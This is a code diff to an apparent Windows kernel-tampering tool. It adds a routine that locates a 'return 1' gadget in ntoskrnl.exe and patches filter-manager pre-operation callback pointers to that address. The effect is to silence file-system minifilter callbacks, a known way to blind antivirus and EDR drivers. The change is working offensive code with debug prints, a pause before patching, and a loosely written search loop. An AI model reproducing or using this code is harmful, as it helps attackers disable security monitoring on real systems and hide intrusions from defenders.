@@ -106,6 +106,56 @@ PVOID FltManager::ResolveFltmgrGlobals(LPVOID lpkFltMgrBase)
 	return (PVOID)((SIZE_T)lpkFltEnumerateFilters + 7 + dwOffset - 0x58);
 }
 
+PVOID FltManager::FindRet1()
+{
+	LPVOID lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
+	printf("Ntos base %llx\n", lpNtosBase);
+	HMODULE hNtos = LoadLibraryExA(R"(C:\WINDOWS\System32\ntoskrnl.exe)", NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE);
+	if (!hNtos) {
+		puts("Could not load ntos");
+		return NULL;
+	}
+
+	// fucking sue me
+	LPVOID lpNtos = (LPVOID)((SIZE_T)hNtos & 0xFFFFFFFFFFFFFF00);
+	
+	INT32 dwOffset = 0;
+	PUCHAR lpData = 0;
+	BOOL bFound = FALSE;
+
+	UCHAR ucharRet1[6] = {
+		0xb8, 0x01, 0x00, 0x00, 0x00, // mov eax 1
+		0xc3 // ret
+	};
+
+	_peb_ldr ldr = _peb_ldr(lpNtos);
+
+	PBYTE lpKeIsEmptyAffinityEx = (PBYTE)ldr.get(cexpr_adler32("KeIsEmptyAffinityEx"));
+	if (!lpKeIsEmptyAffinityEx) {
+		puts("Couldn't find KeIsEmptyAffinityEx");
+		FreeLibrary(hNtos);
+		return NULL;
+	}
+
+	for (SIZE_T i = 0; i < 0x200; i++) {
+		for (SIZE_T j = 0; j < 0x200 + j; j++) {
+			if (lpKeIsEmptyAffinityEx[j + i] != ucharRet1[j]) {
+				break;
+			}
+			else if (j + 1 == sizeof(ucharRet1)) {
+				bFound = TRUE;
+				lpData = lpKeIsEmptyAffinityEx + i;
+			}
+		}
+	}
+
+	SIZE_T func_offset = (SIZE_T)lpKeIsEmptyAffinityEx - (SIZE_T)lpNtos;
+	SIZE_T ret_offset = lpData - lpKeIsEmptyAffinityEx;
+	FreeLibrary(hNtos);
+	return (PVOID)((SIZE_T)lpNtosBase + func_offset + ret_offset);
+}
+
+
 FltManager::FltManager(MemHandler* objMemHandlerArg)
 {
 
@@ -334,10 +384,7 @@ std::vector<FLT_OPERATION_REGISTRATION> FltManager::GetOperationsForFilter(PVOID
 	return retVec;
 }
 
-PVOID FltManager::FindRet1()
-{
-	return PVOID();
-}
+
 
 std::unordered_map<wchar_t*, PVOID> FltManager::EnumFrameVolumes(LPVOID lpFrame)
 {
@@ -413,7 +460,7 @@ DWORD FltManager::GetFrameCount()
 	return this->ulNumFrames;
 }
 
-BOOL FltManager::RemovePreCallbacksForVolumesAndCallbacks(std::vector<FLT_OPERATION_REGISTRATION> vecTargetOperations, std::unordered_map<wchar_t*, PVOID> mapTargetVolumes)
+BOOL FltManager::RemovePreCallbacksForVolumesAndCallbacks(std::vector<FLT_OPERATION_REGISTRATION> vecTargetOperations, std::unordered_map<wchar_t*, PVOID> mapTargetVolumes, LPVOID lpFunctionTarget)
 {
 	ULONG numPatched = 0;
 	for (const FLT_OPERATION_REGISTRATION &op : vecTargetOperations) {
@@ -485,8 +532,12 @@ BOOL FltManager::RemovePreCallbacksForVolumesAndCallbacks(std::vector<FLT_OPERAT
 				if (!b) return FALSE;
 
 				if (lpPreOp == (DWORD64)op.PreOperation) {
+					printf("Callback is at : %llx\tval %llx\n", lpListIter + CALLBACK_NODE_OFFSET_PREOP, lpPreOp);
 					numPatched++;
-					DWORD64 lpTarget = 0xfffff8044eb612b7;
+					puts("about to patch... press a key...");
+					getchar();
+
+					DWORD64 lpTarget = (DWORD64)lpFunctionTarget;
 					b = this->objMemHandler->VirtualWrite(
 						lpListIter + CALLBACK_NODE_OFFSET_PREOP,
 						&lpTarget,
